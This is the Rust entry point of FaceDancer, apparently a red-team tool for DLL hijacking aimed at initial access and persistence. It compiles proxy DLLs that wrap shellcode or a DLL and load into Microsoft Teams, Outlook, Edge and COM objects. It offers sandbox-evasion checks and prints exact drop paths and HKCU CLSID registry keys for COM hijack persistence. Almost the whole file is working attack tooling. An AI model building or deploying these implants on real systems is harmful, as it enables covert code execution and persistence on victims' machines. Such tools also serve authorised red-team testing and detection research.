#![allow(warnings)]
use build::setupcargo;
use clap::{Arg, Command};
use digest::Digest;
use exports::{GenerateExports, ListExports};
use sha2::Sha256;
use std::env;
use std::fs;
use std::fs::File;
use std::io::{BufRead, BufReader, Read};
use std::process::Command as OtherCommand;

fn main() {
    println!(
        r"
    ___________                   ________                                    
    \_   _____/____    ____  ____ \______ \ _____    ____   ____  ___________ 
     |    __) \__  \ _/ ___\/ __ \ |    |  \\__  \  /    \_/ ___\/ __ \_  __ \
     |     \   / __ \\  \__\  ___/ |    `   \/ __ \|   |  \  \__\  ___/|  | \/
     \___  /  (____  /\___  >___  >_______  (____  /___|  /\___  >___  >__|   
         \/        \/     \/    \/        \/     \/     \/     \/    \/                                              
                                    (@Tyl0us)
                "
    );
    let matches = Command::new("FaceDancer")
                .version("1.0")
                .author("Matt Eidelberg - Tyl0us")
                .about("A DLL Hijacking framework for initial access and persistence")
                .subcommand(
                Command::new("recon")
                    .about("Reconnaissance tools")
                    .arg(Arg::new("recon_input")
                        .short('I')
                        .long("Input")
                        .value_name("INPUT")
                        .help("Path to the DLL to examine.")
                        .value_parser(clap::value_parser!(String)))
                    .arg(Arg::new("recon_exports")
                        .short('E')
                        .long("exports")
                        .help("Displays the exported functions for the targeted DLL (only will show the first 20)")
                        .action(clap::ArgAction::SetTrue))
                    .arg(Arg::new("recon_generate")
                        .short('G')
                        .long("generate")
                        .help("Generates the necessary .def for proxying")
                        .action(clap::ArgAction::SetTrue))
                    .arg(Arg::new("recon_dll_name")
                        .short('N')
                        .long("dll-name")
                        .value_name("DLL_NAME")
                        .help("New DLL name to use to point to the original DLL (e.g., 'Windows', 'Excel')")
                        .value_parser(clap::value_parser!(String))
                        .required(false))
                    .arg(Arg::new("recon_word_position")
                        .short('W')
                        .long("word-at-end")
                        .help("Places the random word at the end of the DLL name (e.g., OneAuth-Windows.dll instead of Windows-OneAuth.dll)")
                        .action(clap::ArgAction::SetTrue))
                )
                .subcommand(
                    Command::new("attack")
                        .about("Attack tools")
                        .arg(Arg::new("attack_output")
                            .short('O')
                            .long("Output")
                            .value_name("OUTPUT")
                            .help("Name of output DLL file.")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_input")
                            .short('I')
                            .long("Input")
                            .value_name("INPUT")
                            .help("Path to the 64-bit DLL (.dll) or raw shellcode (.bin).")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_dll")
                            .short('D')
                            .long("DLL")
                            .value_name("DLL")
                            .help("The DLL to proxy: 
                    [1] OneAuth.dll
                    [2] ffmpeg.dll (warning can be unstable)
                    [3] skypert.dll
                    [4] SlimCV.dll
                    [5] domain_actions.dll
                    [6] well_known_domains.dll")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_com")
                            .short('C')
                            .long("COM")
                            .value_name("COM")
                            .help("The COM-DLL to proxy: 
                    [1] ExplorerFrame.dll
                    [2] fastprox.dll
                    [3] mssprxy.dll
                    [4] netprofm.dll
                    [5] npmproxy.dll
                    [6] OneCoreCommonProxyStub.dll
                    [7] propsys.dll                                    
                    [8] stobject.dll
                    [9] wbemprox.dll
                    [10] webplatstorageserver.dll
                    [11] Windows.StateRepositoryPS.dll              
                    [12] windows.storage.dll
                    [13] wpnapps.dll")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_process_load")
                            .short('P')
                            .long("PROCESS")
                            .value_name("PROCESS")
                            .help("Process to proxy load into: 
                    [1] Outlook
                    [2] Excel
                    [3] svchost
                    [4] Explorer
                    [5] sihost
                    [6] msedge
                    [7] OneDriveStandaloneUpdater                             
                    [8] SSearchProtocolHost
                    [9] Olk
                    [10] Teams
                    [11] Werfault            
                    [12] Sdxhelper
                    [13] AppHostRegistrationVerifier
                    [14] rdpclip
                    [15] Microsoft.SharePoint
                    [16] MusNotificationUx
                    [17] PhoneExperienceHost
                    [18] taskhostw
                    [19] DllHost      
                                    ")
                            .value_parser(clap::value_parser!(String)))
                        .arg(Arg::new("attack_sandbox")
                            .short('s')
                            .long("sandbox")
                            .help("Enables sandbox evasion by checking:
                    - Is Endpoint joined to a domain?
                    - Is the file's name the same as its SHA256 value?")
                            .action(clap::ArgAction::SetTrue))
                        .arg(Arg::new("attack_word_position")
                            .short('W')
                            .long("word-at-end")
                            .help("Places the random word at the end of the DLL name (e.g., OneAuth-Windows.dll instead of Windows-OneAuth.dll)")
                            .action(clap::ArgAction::SetTrue))
                            .arg(Arg::new("attack_def")
                            .short('F')
                            .long("def")
                            .value_name("")
                            .help("Path to the .def file used for export generation.")
                            .value_parser(clap::value_parser!(String))
                            .required(false))
                        .arg(Arg::new("attack_export")
                            .short('X')
                            .long("Export")
                            .value_name("EXPORT_NAME")
                            .help("Specify a single export name to proxy.")
                            .value_parser(clap::value_parser!(String))
                            .required(false))
                )
                .get_matches();

    match matches.subcommand() {
        Some(("recon", sub_m)) => {
            let mut _input: Option<&String> = None;
            let has_args = sub_m.get_one::<String>("recon_input").is_some()
                || sub_m.get_flag("recon_exports")
                || sub_m.get_flag("recon_generate");

            if has_args {
                if let Some(input) = sub_m.get_one::<String>("recon_input") {
                    if !input.ends_with(".dll") {
                        eprintln!("[!] Error: Can't parse a non DLL file. Please try again with a valid DLL");
                        std::process::exit(1);
                    }
                    _input = Some(input);
                }
                if sub_m.get_flag("recon_exports") {
                    if let Some(input) = _input {
                        ListExports(input);
                    } else {
                        eprintln!("[!] Error: Missing the -I/--Input flag (DLL input file is required for generating exports).");
                        std::process::exit(1);
                    }
                }
                if sub_m.get_flag("recon_generate") {
                    if let Some(input) = _input {
                        let custom_dll_name = sub_m
                            .get_one::<String>("recon_dll_name")
                            .map(|s| s.as_str());
                        let word_at_end = sub_m.get_flag("recon_word_position");
                        GenerateExports(input, custom_dll_name, word_at_end);
                    } else {
                        eprintln!("[!] Error: Missing the -I/--Input flag (DLL input file is required for generating exports).");
                        std::process::exit(1);
                    }
                }
            } else {
                println!("[!] Missing arguments. Use -h for more options.");
            }
        }
        Some(("attack", sub_m)) => {
            let has_args = sub_m.get_one::<String>("attack_output").is_some()
                || sub_m.get_one::<String>("attack_input").is_some()
                || sub_m.get_one::<String>("attack_dll").is_some()
                || sub_m.get_one::<String>("attack_com").is_some()
                || sub_m.get_one::<String>("attack_process_load").is_some()
                || sub_m.get_flag("attack_sandbox")
                || sub_m.get_flag("attack_word_position")
                || sub_m.get_one::<String>("attack_def").is_some()
                || sub_m.get_one::<String>("attack_export").is_some();

            if has_args {
                let attack_input = match sub_m.get_one::<String>("attack_input") {
                    Some(v) => v,
                    None => {
                        eprintln!("[!] Error: Missing the -I/--Input flag (input file is required).");
                        std::process::exit(1);
                    }
                };
                let compiled_file_name = match sub_m.get_one::<String>("attack_output") {
                    Some(v) => v,
                    None => {
                        eprintln!("[!] Error: Missing the -O/--Output flag (output file name is required).");
                        std::process::exit(1);
                    }
                };
                let mut extension = "";
                let mut fullfile = "";
                let mut file;
                let mut custom_def_file = "";
                let export_name_arg: Option<&str> =
                    sub_m.get_one::<String>("attack_export").map(|s| s.as_str());

                // Validate that -X cannot be used with .bin shellcode input
                if attack_input.ends_with(".bin") && export_name_arg.is_some() {
                    eprintln!("[!] Error: -X/--Export cannot be used with raw shellcode (.bin) input. Export proxying only applies to DLL files.");
                    std::process::exit(1);
                }

                if let Some(proxydll_value) = sub_m.get_one::<String>("attack_dll") {
                    let valid_proxydll = vec![
                        "OneAuth.dll",
                        "ffmpeg.dll",
                        "skypert.dll",
                        "SlimCV.dll",
                        "domain_actions.dll",
                        "well_known_domains.dll",
                    ];
                    if !valid_proxydll.contains(&proxydll_value.as_str()) {
                        eprintln!(
                            "[!] Error: Invalid proxydll option must be one of the following: {}",
                            valid_proxydll.join(", ")
                        );
                        std::process::exit(1);
                    }
                    fullfile = proxydll_value;
                    println!("[+] Execution mode: 'DLL Proxy' selected");
                    println!("[*] {} selected for creation", proxydll_value);
                }
                if let Some(comdll_value) = sub_m.get_one::<String>("attack_com") {
                    let valid_comdll = vec![
                        "ExplorerFrame",
                        "fastprox",
                        "mssprxy",
                        "netprofm",
                        "npmproxy",
                        "OneCoreCommonProxyStub",
                        "propsys",
                        "stobject",
                        "wbemprox",
                        "webplatstorageserver",
                        "Windows.StateRepositoryPS",
                        "windows.storage",
                        "wpnapps",
                    ];
                    let mut comdll_check_value = comdll_value.clone();
                    if comdll_check_value.ends_with(".dll") {
                        comdll_check_value.truncate(comdll_check_value.len() - 4);
                    }
                    if !valid_comdll.contains(&comdll_check_value.as_str()) {
                        eprintln!(
                            "[!] Error: Invalid proxydll option must be one of the following: {}",
                            valid_comdll.join(", ")
                        );
                        std::process::exit(1);
                    }
                    fullfile = comdll_value;
                    println!("[+] Execution mode: 'COM Proxy' selected");
                    println!("[*] {} selected for creation", comdll_value);
                }
                if let Some(processname_value) = sub_m.get_one::<String>("attack_process_load") {
                    let valid_processes = vec![
                        "Outlook",
                        "Excel",
                        "svchost",
                        "Explorer",
                        "sihost",
                        "msedge",
                        "OneDriveStandaloneUpdater",
                        "SSearchProtocolHost",
                        "Olk",
                        "Teams",
                        "Werfault",
                        "Sdxhelper",
                        "AppHostRegistrationVerifier",
                        "rdpclip",
                        "Microsoft.SharePoint",
                        "MusNotificationUx",
                        "PhoneExperienceHost",
                        "taskhostw",
                        "DllHost",
                    ];
                    if !valid_processes.contains(&processname_value.as_str()) {
                        eprintln!("[!] Error: Invalid process name option must be one of the following: {}", valid_processes.join(", "));
                        std::process::exit(1);
                    }
                    fullfile = processname_value;
                    println!("[+] Execution mode: 'Targeted Process' proxying selected");
                    println!("[*] {} selected for creation", processname_value);
                }
                file = fullfile;
                if let Some(def_file) = sub_m.get_one::<String>("attack_def") {
                    if !def_file.ends_with(".def") {
                        eprintln!(
                            "[!] Error: Invalid file type. Please provide a valid .def file."
                        );
                        std::process::exit(1);
                    }
                    println!("[*] Using .def file: {}", def_file);
                    custom_def_file = def_file;
                }
                if sub_m
                    .get_one::<String>("attack_output")
                    .or_else(|| sub_m.get_one::<String>("attack_process_load"))
                    .is_some()
                {
                    if file.starts_with("test.") {
                        eprintln!("[!] Error: Cannot name project test, it conflicts with Rust's built-in test library.");
                        std::process::exit(1);
                    }
                    if file.ends_with(".dll") {
                        file = file.split(".dll").next().unwrap();
                        extension = "dll";
                    }
                } else {
                }
                let mut buildtype = "";
                if sub_m.get_one::<String>("attack_dll").is_some() {
                    buildtype = "DLL";
                } else if sub_m.get_one::<String>("attack_com").is_some() {
                    buildtype = "COM";
                }
                if sub_m.get_one::<String>("attack_process_load").is_some() {
                    buildtype = "Process";
                }
                if custom_def_file != "" {
                    buildtype = "Custom";
                    file = "Custom";
                }
                let sandbox = sub_m.get_flag("attack_sandbox");
                let word_at_end = sub_m.get_flag("attack_word_position");
                let (new_word, com_string) = setupcargo(
                    sub_m.get_one::<String>("attack_input").unwrap(),
                    file,
                    extension,
                    buildtype,
                    sandbox,
                    custom_def_file,
                    export_name_arg.unwrap_or(""),
                    word_at_end,
                );
                buildfile(file, sandbox, buildtype);
                cleanup(
                    file,
                    compiled_file_name,
                    extension,
                    new_word,
                    &com_string,
                    buildtype,
                    custom_def_file,
                    word_at_end,
                );
            } else {
                println!("[!] Missing arguments. Use -h for more options.");
            }
        }
        _ => {
            eprintln!("[!] No valid command was used. Use --help for more information.");
        }
    }
}

fn buildfile(project_name: &str, sandbox: bool, buildtype: &str) {
    let original_path = env::current_dir().unwrap();
    let project_path = original_path.join(project_name);
    env::set_current_dir(&project_path).expect("Failed to change directory to Rust project");
    let mut args;
    if cfg!(target_os = "windows") {
        args = vec!["build", "--release"];
    } else {
        args = vec!["build", "--release", "--target", "x86_64-pc-windows-gnu"];
    };
    args.push("--quiet");

    // Initialize a mutable string for The command rustup target add storing features
    let mut features = String::new();
    if sandbox {
        features.push(' ');
        features.push_str("sandbox");
    }
    if buildtype == "Process" {
        features.push(' ');
        features.push_str("process_mode");
    }
    // Check if there are any features to add
    if !features.is_empty() {
        args.push("--features");
        args.push(&features);
    }
    println!("[*] Compiling Payload... please be patient");
    let status = OtherCommand::new("cargo")
        .args(&args)
        .status()
        .expect("Failed to execute 'cargo build'");

    if !status.success() {
        eprintln!("Error: 'cargo build' failed. Please ensure you have the following:");
        eprintln!("- The Target 'x86_64-pc-windows-gnu'");
        std::process::exit(1);
    }
    env::set_current_dir(&original_path).expect("Failed to change directory back to original path");
}

fn extract_dll_name_from_def_file(def_file_path: &str) -> Option<String> {
    if let Ok(file) = File::open(def_file_path) {
        let reader = BufReader::new(file);
        for line in reader.lines() {
            if let Ok(line) = line {
                let trimmed = line.trim();
                // Skip empty lines, comments, and the EXPORTS header
                if trimmed.is_empty() || trimmed.starts_with(';') || trimmed == "EXPORTS" {
                    continue;
                }

                // Look for export lines with format: FunctionName=DLLName.FunctionName @ordinal
                if let Some(equals_pos) = trimmed.find('=') {
                    let right_side = &trimmed[equals_pos + 1..];
                    if let Some(dot_pos) = right_side.find('.') {
                        let dll_name = &right_side[..dot_pos];
                        if !dll_name.is_empty() {
                            return Some(dll_name.to_string());
                        }
                    }
                }
            }
        }
    }
    None
}

fn extract_library_name_from_def_file(def_file_path: &str) -> Option<String> {
    if let Ok(file) = File::open(def_file_path) {
        let reader = BufReader::new(file);
        for line in reader.lines() {
            if let Ok(line) = line {
                let trimmed = line.trim();
                // Look for LIBRARY line: LIBRARY "DLLName"
                if trimmed.starts_with("LIBRARY") {
                    // Extract the name between quotes
                    if let Some(start) = trimmed.find('"') {
                        if let Some(end) = trimmed[start + 1..].find('"') {
                            return Some(trimmed[start + 1..start + 1 + end].to_string());
                        }
                    }
                    // No quotes, try to get the name after LIBRARY
                    let parts: Vec<&str> = trimmed.split_whitespace().collect();
                    if parts.len() > 1 {
                        return Some(parts[1].to_string());
                    }
                }
            }
        }
    }
    None
}

pub fn cleanup(
    project_name: &str,
    file_name: &str,
    _extension: &str,
    new_word: String,
    com_string: &str,
    buildtype: &str,
    def_file: &str,
    word_at_end: bool,
) {
    let original_path = env::current_dir().unwrap();
    let project_path = original_path.join(project_name);
    let full_target_name = if word_at_end {
        format!("{}-{}", project_name, new_word)
    } else {
        format!("{}-{}", new_word, project_name)
    };
    let compiled_file_pathway = if cfg!(target_os = "windows") {
        project_path.join("target").join("release")
    } else {
        project_path
            .join("target")
            .join("x86_64-pc-windows-gnu")
            .join("release")
    };

    let compiled_file = compiled_file_pathway.join(format!("{}.dll", project_name));
    if !compiled_file.exists() {
        eprintln!("[!] Error: Compiled file not found");
        std::process::exit(1);
    }

    let target_file = original_path.join(format!("{}", file_name));
    fs::copy(compiled_file, &target_file).expect("[!] Failed to copy compiled file");
    fs::remove_dir_all(project_path).expect("Failed to remove Rust project folder");

    if buildtype == "DLL" {
        let expected_proxy_name = format!("{}.dll", project_name);
        println!(
            "[!] Important: Rename the original dll to '{}.dll', rename '{}' to '{}', and drop your proxy DLL into the following directory:",
            full_target_name, file_name, expected_proxy_name
        );
        if project_name == "OneAuth" {
            println!("C:\\Users\\{{username}}\\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\{{version}}\\x64\\OneAuth.dll");
            println!("Warning in some versions of TeamsMeetingAddin the actual folder name is TeamsMeetingAdd-in (Microsoft being Microsoft)");
        } else if project_name == "ffmpeg" {
            println!(
                "C:\\Users\\{{username}}\\AppData\\Local\\Microsoft\\Teams\\current\\ffmpeg.dll"
            );
            println!(
                "[*] Friendly reminder that this DLL maybe unstable depending on version of Teams"
            );
        } else if project_name == "skypert" {
            println!("C:\\Users\\{{username}}\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar.unpacked\\node_modules\\slimcore\\bin\\skypert.dll");
        } else if project_name == "SlimCV" {
            println!("C:\\Users\\{{username}}\\AppData\\Local\\Microsoft\\Teams\\current\\resources\\app.asar.unpacked\\node_modules\\slimcore\\bin\\SlimCV.dll");
        } else if project_name == "domain_actions" {
            println!("");
            println!("  [1] MS Teams:");
            println!("      %LOCALAPPDATA%\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams\\EBWebView\\Domain Actions\\3.0.0.16\\domain_actions.dll");
            println!("");
            println!("  [2] Outlook:");
            println!("      %LOCALAPPDATA%\\Microsoft\\Olk\\EBWebView\\Domain Actions\\3.0.0.16\\domain_actions.dll");
            println!("");
            println!("  [3] Office Webview:");
            println!("      %LOCALAPPDATA%\\Microsoft\\Office\\16.0\\Wef\\webview2\\41f5eca4-3ef7-47f5-bb96-543406b9d7d7_ADAL\\2\\EBWebView\\Domain Actions\\3.0.0.16\\domain_actions.dll");
            println!("");
            println!("  [4] Office Hub:");
            println!("      %LOCALAPPDATA%\\Packages\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\LocalState\\EBWebView\\Domain Actions\\3.0.0.16\\domain_actions.dll");
            println!("");
            println!("  [5] Windows Search:");
            println!("      %LOCALAPPDATA%\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\LocalState\\EBWebView\\Domain Actions\\3.0.0.16\\domain_actions.dll");
            println!("");
            println!("  [6] Microsoft Edge:");
            println!("      %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Domain Actions\\3.0.0.16\\domain_actions.dll");
            println!("");
            println!(
                "[*] Note: Rename the original DLL to '{}.dll' before placing your proxy DLL",
                full_target_name
            );
        } else if project_name == "well_known_domains" {
            println!("[*] well_known_domains.dll can be placed in the following location:");
            println!("");
            println!("  Microsoft Edge:");
            println!("  %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Well Known Domains\\1.2.0.0\\well_known_domains.dll");
            println!("");
            println!(
                "[*] Note: Rename the original DLL to '{}.dll' before placing your proxy DLL",
                full_target_name
            );
        }
    } else if buildtype == "Custom" {
        println!("[+] Successfully generated custom DLL using your .def file!");

        // Extract and display the library name and target DLL name from the .def file
        let library_name = extract_library_name_from_def_file(def_file);
        let target_dll_name = extract_dll_name_from_def_file(def_file);

        if let Some(lib_name) = &library_name {
            println!("[*] Original DLL name: {}.dll", lib_name);
        }

        if let Some(renamed_name) = &target_dll_name {
            println!("[*] Renamed DLL target: {}.dll", renamed_name);
            if let Some(lib_name) = &library_name {
                println!(
                    "[!] Important: Rename the original '{}.dll' to '{}.dll'",
                    lib_name, renamed_name
                );
            }
        } else {
            println!("[!] Could not extract target DLL name from .def file");
        }
    } else {
        println!("[!] Important: Create the following registry keys:");
        println!(
            "HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{}",
            com_string
        );
        println!(
            "HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{}\\InprocServer32",
            com_string
        );
        println!("[!] Make sure the InprocServer32's default key contains the path to the DLL");
    }

    let mut file = File::open(target_file).expect("[!] Failed to open file");
    let mut buf_reader = BufReader::new(file);
    let mut hasher = Sha256::new();
    let mut buffer = [0; 1024];
    loop {
        let bytes_read = buf_reader
            .read(&mut buffer)
            .expect("[!] Failed to read file");
        if bytes_read == 0 {
            break;
        }
        hasher.update(&buffer[..bytes_read]);
    }
    let result = hasher.finalize();
    println!("[*] SHA-256 hash: {:x}", result);
}
